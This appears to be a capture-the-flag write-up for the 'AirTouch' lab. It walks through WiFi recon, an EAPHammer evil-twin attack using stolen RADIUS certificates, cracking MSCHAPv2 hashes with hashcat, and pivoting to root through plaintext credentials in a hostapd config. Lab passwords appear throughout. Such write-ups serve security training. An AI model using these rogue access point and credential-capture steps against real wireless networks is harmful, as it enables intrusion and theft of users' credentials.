# AirTouch

## Overview

AirTouch is a really fun box that simulates a corporate WiFi environment. You're dropped into a consultant's machine and need to pivot through multiple WiFi networks to eventually reach the corporate network and pop root. If you've ever wanted to learn about WPA2-Enterprise attacks, this is your box.

**Difficulty:** Medium/Hard
**Skills:** WiFi hacking, WPA2-EAP attacks, network pivoting, credential hunting

---

## Initial Access - The Consultant Machine

We start by SSHing into the consultant's machine. This simulates being an external pentester who's been given access to a laptop on-site.

```bash
ssh consultant@10.xx.xx.xx
# Password: RxBlZhLmOkacNWScmZ6D
```

Once in, we find ourselves on a machine with multiple wireless interfaces (wlan0 through wlan6). Running `iwconfig` shows us all the WiFi adapters available - this box is basically a WiFi hacking playground.

---

## Recon - What WiFi Networks Are Out There?

Let's scan for nearby networks:

```bash
consultant@AirTouch-Consultant:~$ sudo ip link set wlan0 up
consultant@AirTouch-Consultant:~$ sudo iw dev wlan0 scan | grep -E "SSID|signal|freq"
        freq: 2412
        signal: -30.00 dBm
        SSID: vodafoneFB6N
                 * Multiple BSSID
                 * SSID List
        freq: 2422
        signal: -30.00 dBm
        SSID: MOVISTAR_FG68
                 * Multiple BSSID
                 * SSID List
        freq: 2437
        signal: -30.00 dBm
        SSID: AirTouch-Internet
                 * Multiple BSSID
                 * SSID List
        freq: 2437
        signal: -30.00 dBm
        SSID: WIFI-JOHN
                 * Multiple BSSID
                 * SSID List
        freq: 2452
        signal: -30.00 dBm
        SSID: MiFibra-24-D4VY
                 * Multiple BSSID
                 * SSID List
        freq: 5220
        signal: -30.00 dBm
        SSID: AirTouch-Office
                 * Multiple BSSID
                 * SSID List
        freq: 5220
        signal: -30.00 dBm
        SSID: AirTouch-Office
                 * Multiple BSSID
                 * SSID List
consultant@AirTouch-Consultant:~$ 
```

We find two interesting networks:
- **AirTouch-Internet** - WPA2-PSK (the easy one)
- **AirTouch-Office** - WPA2-Enterprise/EAP (the juicy corporate one)

```bash
consultant@AirTouch-Consultant:~$ sudo dhclient -v wlan0
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan0/02:00:00:00:00:00
Sending on   LPF/wlan0/02:00:00:00:00:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 3 (xid=0x4c990b5e)
DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 5 (xid=0x4c990b5e)
DHCPOFFER of 192.168.3.61 from 192.168.3.1
DHCPREQUEST for 192.168.3.61 on wlan0 to 255.255.255.255 port 67 (xid=0x5e0b994c)
DHCPACK of 192.168.3.61 from 192.168.3.1 (xid=0x4c990b5e)
bound to 192.168.3.61 -- renewal in 35771 seconds.
consultant@AirTouch-Consultant:~$ ip addr show wlan0
7: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.61/24 brd 192.168.3.255 scope global dynamic wlan0
       valid_lft 86340sec preferred_lft 86340sec
    inet6 fe80::ff:fe00:0/64 scope link 
       valid_lft forever preferred_lft forever
consultant@AirTouch-Consultant:~$
```

## Scan

```bash
consultant@AirTouch-Consultant:~$ sudo nmap -p 22,80,443,8080,8000 192.168.3.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-19 10:21 UTC
Nmap scan report for 192.168.3.1
Host is up (0.00018s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
8000/tcp closed http-alt
8080/tcp closed http-proxy
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)

Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
consultant@AirTouch-Consultant:~$ 
```

The Office network is where we want to be - that's where the corporate network (10.10.10.0/24) lives.

---

## Connecting to AirTouch-Internet (PSK Network)

First, let's connect to the simpler PSK network to do some recon. The password `challenge` was found earlier through other enumeration.

```bash
# Create wpa_supplicant config
cat > /tmp/internet.conf << EOF
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="AirTouch-Internet"
    psk="challenge"
}
EOF

# Connect
wpa_supplicant -B -i wlan0 -c /tmp/internet.conf
dhclient wlan0
```

We get an IP on the 192.168.3.0/24 network. This puts us on what looks like a "tablet" VLAN - basically the guest network.

```bash
ssh -L 8080:192.168.3.1:80 consultant@10.129.11.30
```
---


## Grabbing Certs from the Access Point

By accessing the web interface on the AP (192.168.3.1), we find a backup of certificates in `/root/certs-backup/`. These are the RADIUS server certificates used for the Enterprise WiFi authentication:

- `ca.crt` - Certificate Authority cert
- `server.crt` - Server certificate
- `server.key` - Private key (jackpot!)

Having these certs is huge - they let us set up a rogue access point that looks legit to clients.

---

## The Evil Twin Attack (EAPHammer)

Here's where it gets fun. WPA2-Enterprise uses RADIUS authentication, and we can capture credentials by setting up a fake access point. When users connect to our evil twin, they send their credentials, and we grab the MSCHAPv2 hash.

The consultant machine has EAPHammer installed at `/root/eaphammer`. We import our stolen certs and fire it up:

```bash
cd /root/eaphammer
./eaphammer --cert-wizard import --ca /tmp/ca.crt --cert /tmp/server.crt --key /tmp/server.key

./eaphammer -i wlan2 --channel 44 --auth wpa-eap --essid AirTouch-Office --creds
```

When a victim connects (or we deauth them to force reconnection), we capture their hash:

```
r4ulcl::::44f28ddcdee840ba624c37cecee4abb195225e207209cc33:da61d7057fb69203
```

---

## Cracking the Hash

MSCHAPv2 hashes are notoriously weak. Let's crack it with hashcat:

```bash
# On our local Kali box (XX.XX.XX.XX)
hashcat -m 5500 mschapv2.hash /usr/share/wordlists/rockyou.txt
```

And we get: `chicken`

But wait - there's more! We also find another hash for `r4ulcl@AirTouch.htb` that cracks to `xGgWEwqUpfoOVsLeROeG`. Keep that one in your pocket.

---

## Connecting to AirTouch-Office (The Corporate Network)

Now for the tricky part. WPA2-Enterprise needs more than just a password - it needs proper identity formatting. After some trial and error, the magic config is:

```bash
cat > /tmp/office.conf << EOF
ctrl_interface=/var/run/wpa_supplicant
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}
EOF

wpa_supplicant -B -i wlan6 -c /tmp/office.conf
dhclient wlan6
```



Key insight: The identity needs the domain prefix `AirTouch\r4ulcl`, and the password is `laboratory` (not the cracked `chicken` - that was likely an old password).

We get IP **10.10.10.98** - we're on the corporate network now!

---

## Pivoting to the Management Server

Remember that other password we cracked? `xGgWEwqUpfoOVsLeROeG`? Let's try it:

```bash
ssh remote@10.10.10.1
# Password: xGgWEwqUpfoOVsLeROeG
```

We're in! The hostname is `AirTouch-AP-MGT` - this is the access point management server.

---

## User Flag

```bash
cat /home/remote/user.txt
# [user flag here]
```

---

## Privilege Escalation - Finding Admin Creds

The `remote` user can't sudo, and we need to get to root. Time to hunt for credentials.

Looking around the system, we find the hostapd configuration directory. Hostapd is the daemon that handles WiFi authentication, and guess what it needs? User credentials.

```bash
cat /etc/hostapd/hostapd.eap_user
```

Buried in this config file:

```
"AirTouch\r4ulcl"  MSCHAPV2  "laboratory" [2]
"admin"            MSCHAPV2  "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

The admin password is just sitting there in plaintext! This is actually realistic - RADIUS user databases often store credentials in recoverable formats.

---

## Getting Root

```bash
su admin
# Password: xMJpzXt4D9ouMuL3JJsMriF7KZozm7

sudo -i
# admin is in sudoers!

cat /root/root.txt
```

**Root Flag: "XXXXXXXXXXXXXXXXXXX`**

---

## Summary

The attack chain:

1. **Initial Access** - SSH to consultant machine with provided creds
2. **WiFi Recon** - Discover AirTouch-Internet (PSK) and AirTouch-Office (EAP) networks
3. **Certificate Theft** - Connect to PSK network, grab RADIUS certs from AP web interface
4. **Evil Twin Attack** - Use EAPHammer to capture MSCHAPv2 credentials
5. **Hash Cracking** - Crack the captured hash with hashcat
6. **Corporate Access** - Connect to WPA2-Enterprise network with stolen creds
7. **Lateral Movement** - SSH to management server with secondary cracked password
8. **Privilege Escalation** - Find admin creds in hostapd config, su to admin, sudo to root

---

## Key Takeaways

- **WPA2-Enterprise isn't bulletproof** - If you can set up a rogue AP with valid-looking certs, users will connect and give you their hashes
- **MSCHAPv2 is weak** - Those hashes crack fast with a good wordlist
- **Credential reuse is everywhere** - The same passwords kept showing up in different places
- **Config files are gold mines** - Always check service configurations for hardcoded credentials
- **Domain prefixes matter** - `r4ulcl` vs `AirTouch\r4ulcl` can be the difference between success and failure

---

## Tools Used

- `wpa_supplicant` - WiFi connection management
- `EAPHammer` - Evil twin attacks against WPA2-Enterprise
- `hashcat` - Password cracking (mode 5500 for MSCHAPv2)
- `iw` / `iwconfig` - WiFi interface management
- Standard Linux tools (ssh, cat, grep, etc.)

---

*Box completed! GG AirTouch.*


